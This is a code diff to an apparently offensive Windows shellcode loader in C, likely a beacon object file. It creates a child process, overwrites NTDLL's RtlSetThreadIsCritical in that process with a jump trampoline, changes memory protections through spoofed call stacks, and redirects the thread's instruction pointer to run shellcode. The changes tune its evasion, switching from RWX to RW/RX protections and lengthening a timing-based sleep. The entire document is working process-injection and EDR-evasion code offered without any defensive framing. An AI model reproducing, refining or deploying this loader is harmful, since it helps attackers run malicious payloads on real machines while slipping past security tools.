@@ -7,15 +7,14 @@
 #include "shellwriter.h"
 #include "spoof.h"
 
+#define GETRESOURCE(x) (char *)&x
+#define memset(x, y, z) __stosb((unsigned char *)x, y, z);
 
-#define GETRESOURCE(x) ( char * ) &x
-#define memset(x, y, z) __stosb ( ( unsigned char * ) x, y, z );
-
-typedef struct {
-    int  length;
-    char value [ ];
+typedef struct
+{
+    int length;
+    char value[];
 } RESOURCE;
-
 
 char __SC__[0] __attribute__((section("sc")));
 char __MASK__[0] __attribute__((section("mask")));
@@ -71,6 +70,7 @@ void go()
         .MaximumLength = (USHORT)sizeof(stub)};
 
     PRTL_USER_PROCESS_PARAMETERS procParams = NULL;
+
     NTSTATUS status = NTDLL$RtlCreateProcessParametersEx(
         &procParams, &imagePath,
         NULL, NULL, NULL, NULL, NULL, NULL,
@@ -111,7 +111,7 @@ void go()
     /* ── Wait for child PEB to be ready ────────────────────────────── */
     /* poor mans sleep */
     unsigned long long start, now;
-    unsigned long long cycles = 200 * 3000000ULL; /* 3M cycles per ms */
+    unsigned long long cycles = 300 * 3000000ULL; /* 3M cycles per ms */
     __asm__ volatile("rdtsc" : "=A"(start));
     do
     {
@@ -180,7 +180,9 @@ void go()
     }
 
     /* ── Hijack child thread RIP → shellcode ───────────────────────── */
-    static CONTEXT ctx_storage;
+    // static CONTEXT ctx_storage;
+    // CONTEXT *ctx = &ctx_storage;
+    __attribute__((aligned(16))) CONTEXT ctx_storage = {0};
     CONTEXT *ctx = &ctx_storage;
     for (int _z = 0; _z < (int)sizeof(CONTEXT); _z++)
         ((u8 *)ctx)[_z] = 0;
@@ -196,9 +198,6 @@ void go()
         return;
     }
 
-
-
-    
     /* ── Build trampoline → shellcode ─────────────────────────────── */
     /* jmp [rip+0] + shellcode_addr = 14 bytes */
     u8 trampoline[14];
@@ -208,24 +207,27 @@ void go()
     trampoline[3] = 0x00;
     trampoline[4] = 0x00;
     trampoline[5] = 0x00;
-    *(u64*)(trampoline + 6) = (u64)shellcode;
+    *(u64 *)(trampoline + 6) = (u64)shellcode;
 
     /* ── Find target function in child (same base as parent) ───────── */
     u64 target_fn = (u64)NTDLL$RtlSetThreadIsCritical;
 
     /* ── Make target function writable in child ────────────────────── */
     PVOID tramp_base = (PVOID)(target_fn & ~(4096 - 1));
+    PVOID tramp_base_orig = tramp_base;
     // SIZE_T tramp_size = 14 + (target_fn - (u64)tramp_base);
     SIZE_T tramp_size = 4096;
+    SIZE_T tramp_size_orig = tramp_size;
 
     ULONG tramp_oldp = 0;
 
     status = (NTSTATUS)spoof_call(
         (u64)NTDLL$NtProtectVirtualMemory,
         (u64)hProcess, (u64)&tramp_base,
-        (u64)&tramp_size, (u64)PAGE_EXECUTE_READWRITE, (u64)&tramp_oldp,
+        (u64)&tramp_size, (u64)PAGE_READWRITE, (u64)&tramp_oldp,
         0, 0, 0, 0, 0, 0);
-    if (!NT_SUCCESS(status)) {
+    if (!NT_SUCCESS(status))
+    {
         dprintf("[-] NtProtectVirtualMemory (trampoline): 0x%X\n", status);
         return;
     }
@@ -237,32 +239,36 @@ void go()
         (u64)hProcess, (u64)target_fn,
         (u64)trampoline, (u64)14, (u64)&written,
         0, 0, 0, 0, 0, 0);
-    if (!NT_SUCCESS(status)) {
+    if (!NT_SUCCESS(status))
+    {
         dprintf("[-] NtWriteVirtualMemory: 0x%X\n", status);
         return;
     }
 
+    tramp_base = tramp_base_orig;
+    tramp_size = tramp_size_orig;
     /* ── Restore protection ─────────────────────────────────────────── */
     status = (NTSTATUS)spoof_call(
         (u64)NTDLL$NtProtectVirtualMemory,
         (u64)hProcess, (u64)&tramp_base,
-        (u64)&tramp_size, (u64)tramp_oldp,
+        (u64)&tramp_size, (u64)PAGE_EXECUTE_READ,
         (u64)&tramp_oldp,
         0, 0, 0, 0, 0, 0);
 
     /* ── Set RIP to trampoline target (not shellcode directly) ─────── */
     ctx->Rip = target_fn;
+    // ctx->Rip = (DWORD64)shellcode;
 
     status = (NTSTATUS)spoof_call(
         (u64)NTDLL$NtSetContextThread,
         (u64)hThread, (u64)ctx,
         0, 0, 0, 0, 0, 0, 0, 0, 0);
-    if (!NT_SUCCESS(status)) {
+    if (!NT_SUCCESS(status))
+    {
         dprintf("[-] NtSetContextThread: 0x%X\n", status);
         return;
     }
 
     dprintf("[+] RIP → trampoline → shellcode\n");
     dprintf("[+] === EXIT LOADER ===\n");
-
 }
